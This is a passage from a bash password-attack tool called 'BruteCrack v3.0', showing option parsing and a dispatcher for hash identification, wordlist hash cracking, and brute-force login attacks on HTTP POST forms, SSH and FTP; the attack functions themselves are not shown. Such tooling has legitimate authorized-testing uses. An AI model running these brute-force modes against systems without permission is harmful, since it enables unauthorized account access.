    -d) DELAY="$2";       shift 2 ;;
    -o) OUTPUT_FILE="$2"; shift 2 ;;
    --type)     HASH_TYPE="$2";  shift 2 ;;
    --salt)     SALT="$2";       shift 2 ;;
    --salt-pos) SALT_POS="$2";   shift 2 ;;
    --all-types) TRY_ALL_TYPES=true; shift ;;
    --json)      JSON_OUTPUT=true;   shift ;;
    --help) banner; usage; exit 0 ;;
    *) echo -e "${RED}[!] Unknown option: $1${RESET}"; usage; exit 1 ;;
  esac
done

banner

[[ "$MODE" == "--help" ]] && usage && exit 0

# Output file init
if [[ -n "$OUTPUT_FILE" ]]; then
  echo "BruteCrack v3.0 — Results — $(date)" > "$OUTPUT_FILE"
  echo "Mode: $MODE | Target: $TARGET" >> "$OUTPUT_FILE"
  echo "================================================" >> "$OUTPUT_FILE"
  echo -e "${CYAN}[*] Saving output to: $OUTPUT_FILE${RESET}"
fi

# ════════════════════════════════════════════════════════════════════
#   DISPATCH
# ════════════════════════════════════════════════════════════════════
case "$MODE" in
  --identify)
    [[ -z "$TARGET" ]] && echo -e "${RED}[!] Use -t <hash>${RESET}" && exit 1
    print_identify "$TARGET" "$JSON_OUTPUT"
    ;;
  --scan-file)
    FILE="${TARGET:-$WORDLIST}"
    [[ -z "$FILE" ]] && echo -e "${RED}[!] Use -t <hashfile> or -w <hashfile>${RESET}" && exit 1
    scan_hash_file "$FILE"
    ;;
  --hash)
    [[ -z "$WORDLIST" || ! -f "$WORDLIST" ]] && echo -e "${RED}[!] Wordlist not found. Use -w <file>${RESET}" && exit 1
    [[ -z "$TARGET" ]] && echo -e "${RED}[!] No hash provided. Use -t <hash>${RESET}" && exit 1
    check_deps
    hash_crack
    ;;
  --http-post)
    [[ -z "$WORDLIST" || ! -f "$WORDLIST" ]] && echo -e "${RED}[!] Wordlist required. Use -w <file>${RESET}" && exit 1
    [[ -z "$TARGET" ]] && echo -e "${RED}[!] Target required. Use -t <url>${RESET}" && exit 1
    check_deps
    http_post_attack
    ;;
  --ssh)
    [[ -z "$WORDLIST" || ! -f "$WORDLIST" ]] && echo -e "${RED}[!] Wordlist required.${RESET}" && exit 1
    [[ -z "$TARGET" ]] && echo -e "${RED}[!] Target IP required.${RESET}" && exit 1
    check_deps
    ssh_attack
    ;;
  --ftp)
    [[ -z "$WORDLIST" || ! -f "$WORDLIST" ]] && echo -e "${RED}[!] Wordlist required.${RESET}" && exit 1
    [[ -z "$TARGET" ]] && echo -e "${RED}[!] Target IP required.${RESET}" && exit 1
    check_deps
    ftp_attack
    ;;
  *)
    echo -e "${RED}[!] Unknown mode: $MODE${RESET}"
    usage; exit 1
    ;;
esac
